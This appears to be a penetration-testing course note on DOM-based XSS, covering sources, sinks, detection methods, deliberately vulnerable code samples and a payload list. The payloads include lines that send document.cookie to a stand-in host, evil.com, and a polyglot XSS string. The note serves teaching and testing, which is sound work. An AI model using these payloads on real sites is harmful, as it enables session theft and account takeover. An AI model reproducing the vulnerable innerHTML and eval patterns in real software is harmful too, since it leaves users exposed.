---
tags: [vapt, xss, intermediate]
difficulty: intermediate
module: "07 - XSS"
topic: "07.04 DOM-Based XSS"
portswigger_labs: "Cross-site scripting"
---

# 07.04 — DOM-Based XSS

## What is DOM-Based XSS?

DOM-Based XSS occurs entirely client-side — the server never sees the payload. JavaScript on the page reads data from a controllable source (URL fragment, localStorage) and writes it unsafely to the DOM. The server response is clean; the vulnerability is in the JavaScript code itself.

```
REFLECTED/STORED XSS:
  Payload in request → Server includes in response → Browser renders

DOM-BASED XSS:
  Payload in URL fragment (#) or other source
  → Browser receives CLEAN server response
  → Client-side JavaScript reads document.location.hash
  → JavaScript writes it to DOM unsafely
  → XSS fires!
  
  Server-side WAFs CANNOT see this — it never reaches the server!

EXAMPLE:
  URL: https://target.com/page#<script>alert(1)</script>
  JavaScript: 
    var hash = location.hash.slice(1);
    document.getElementById("output").innerHTML = hash;  ← SINK!
  
  Browser executes: innerHTML = "<script>alert(1)</script>"
  → XSS! (note: script tags in innerHTML don't execute, but <img onerror=> does!)
```

---

## Sources and Sinks

DOM XSS requires a **source** (attacker-controlled data) flowing to a **sink** (dangerous function).

### Common Sources

```javascript
// SOURCE = where attacker-controlled data comes from:
document.URL
document.location
document.location.href
document.location.search
document.location.hash
document.location.pathname
document.referrer
window.name
history.pushState() / history.replaceState()
localStorage.getItem()
sessionStorage.getItem()
document.cookie
XMLHttpRequest response data
WebSocket message data
postMessage data (window.addEventListener('message'))
```

### Dangerous Sinks

```javascript
// HTML SINKS (can inject HTML/script):
element.innerHTML = TAINTED
element.outerHTML = TAINTED
document.write(TAINTED)
document.writeln(TAINTED)
element.insertAdjacentHTML('beforeend', TAINTED)

// JAVASCRIPT EXECUTION SINKS:
eval(TAINTED)
setTimeout(TAINTED)
setInterval(TAINTED)
new Function(TAINTED)

// URL SINKS:
element.src = TAINTED          // <script src=>, <img src=>
element.href = TAINTED         // <a href=>
location.href = TAINTED        // redirect (javascript: URI!)
location.assign(TAINTED)
location.replace(TAINTED)
window.open(TAINTED)

// JQUERY SINKS:
$(TAINTED)                     // jQuery selector
$().html(TAINTED)
$().append(TAINTED)
$().prepend(TAINTED)
$().after(TAINTED)
$().before(TAINTED)
$().attr(TAINTED)
$.parseHTML(TAINTED)
```

---

## Detecting DOM XSS

```bash
# STEP 1: FIND SOURCES IN PAGE JAVASCRIPT
# Download all JS files and search for dangerous reading of sources:
grep -r "location.hash\|location.search\|document.referrer\|window.name" *.js

# STEP 2: TRACE DATA FLOW TO SINKS
# Find where read data is used:
grep -r "innerHTML\|document.write\|eval\|setTimeout\|location.href" *.js

# STEP 3: MANUAL TESTING — INJECT CANARY IN EACH SOURCE:
# URL hash:
https://target.com/#<canary>
# URL parameter (if JS reads it):
https://target.com/?q=<canary>
# Referrer: visit from: https://CANARY.google.com/
# window.name: open('https://target.com/', 'CANARY_NAME')

# STEP 4: USE BROWSER DEVTOOLS
# Console: search for canary in DOM
# Event Listeners panel: look for message listeners
# Sources: Ctrl+F to search for location.hash usage

# STEP 5: DOM INVADER (Burp Suite extension)
# Burp Suite's DOM Invader automatically detects DOM XSS sources/sinks
# Configuration → Extensions → DOM Invader → Enable
```

---

## DOM XSS Examples

### Classic Hash-Based

```javascript
// VULNERABLE CODE:
var page = location.hash.substring(1);
document.getElementById("content").innerHTML = page;

// EXPLOIT URL:
https://target.com/#<img src=x onerror=alert(document.domain)>
// Note: <script> doesn't execute via innerHTML, use event handlers!
```

### URL Search Param

```javascript
// VULNERABLE CODE:
var params = new URLSearchParams(location.search);
var name = params.get('name');
document.getElementById("greeting").innerHTML = "Hello, " + name + "!";

// EXPLOIT:
https://target.com/?name=<img src=x onerror=alert(1)>
```

### Open Redirect to XSS

```javascript
// VULNERABLE CODE:
var redirect = location.hash.slice(1);
location.href = redirect;  // SINK!

// EXPLOIT:
https://target.com/#javascript:alert(document.cookie)
// location.href = "javascript:alert(document.cookie)" → XSS!
```

### postMessage

```javascript
// VULNERABLE CODE:
window.addEventListener('message', function(e) {
  document.getElementById("output").innerHTML = e.data;
}, false);
// No origin check! Any window can send messages!

// EXPLOIT (from attacker's page):
var target = window.open('https://target.com/page');
target.postMessage('<img src=x onerror=alert(document.domain)>', '*');
```

### jQuery DOM Manipulation

```javascript
// VULNERABLE CODE (older jQuery):
$(location.hash)  // jQuery parses hash as HTML/CSS selector!

// EXPLOIT:
https://target.com/#<img src=x onerror=alert(1)>
// jQuery evaluates as HTML, creates the img element!
```

---

## DOM XSS Payloads

```html
<!-- FOR innerHTML / document.write SINKS: -->
<!-- (note: <script> doesn't fire in innerHTML) -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>

<!-- FOR eval() SINKS: -->
alert(1)
alert(document.cookie)
fetch('https://evil.com/?c='+document.cookie)

<!-- FOR location.href SINKS (javascript: URI): -->
javascript:alert(1)
javascript:document.location='https://evil.com/?c='+document.cookie

<!-- FOR setTimeout/setInterval SINKS: -->
alert(document.cookie)
fetch('https://evil.com/?c='+document.cookie)

<!-- POLYGLOT (works in multiple contexts): -->
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

---

## DOM XSS Testing Tools

```bash
# DOMSCANNER (static analysis):
# Install: pip3 install domdig
domdig -u "https://target.com"

# DOMHUNTER:
git clone https://github.com/nicktindall/domhunter.git

# BURP DOM INVADER:
# In Burp Browser (chromium embedded):
# Extensions → DOM Invader → Enable
# Browse site → DOM Invader finds and reports DOM sources/sinks

# DALFOX (also detects DOM XSS):
dalfox url "https://target.com/page#FUZZ"

# JSHUNTER:
# Looks for sources and sinks in JavaScript code:
git clone https://github.com/shashank912/jshunter.git
python3 jshunter.py -u "https://target.com"

# RETIRE.JS (find vulnerable jQuery versions):
retire --js --outputformat json https://target.com
# Old jQuery versions have DOM XSS via $(selector) parsing
```

---

## Finding DOM XSS in JavaScript Source

```bash
# DOWNLOAD ALL JS FILES:
curl -s https://target.com | grep -oP 'src="[^"]+\.js"' | \
  sed 's/src="//;s/"//' | while read js; do
    [ "${js:0:4}" = "http" ] || js="https://target.com$js"
    curl -s "$js"
  done > all.js

# FIND DANGEROUS SINKS:
grep -n "innerHTML\|outerHTML\|document\.write\|eval\|setTimeout\|location\.href\|location\.assign" all.js

# FIND SOURCES:
grep -n "location\.hash\|location\.search\|document\.referrer\|window\.name\|postMessage\|localStorage" all.js

# LOOK FOR JQUERY ISSUES:
grep -n "\$(location\|anchor\|#" all.js  # jQuery selector with URL input
grep -n "\.html(\|\.append(\|\.prepend(" all.js  # jQuery HTML sinks

# SOURCE MAP ANALYSIS (if available):
# Source maps reveal original code structure
# See 05.17 - JavaScript File Analysis
```

---

## Related Notes
- [[02 - Reflected XSS]] — server-side reflected variant
- [[17 - JavaScript File Analysis]] — finding DOM XSS in JS
- [[08 - XSS in JavaScript Context]] — XSS in JS string contexts
- [[21 - XSS Payloads Comprehensive List]] — payload reference
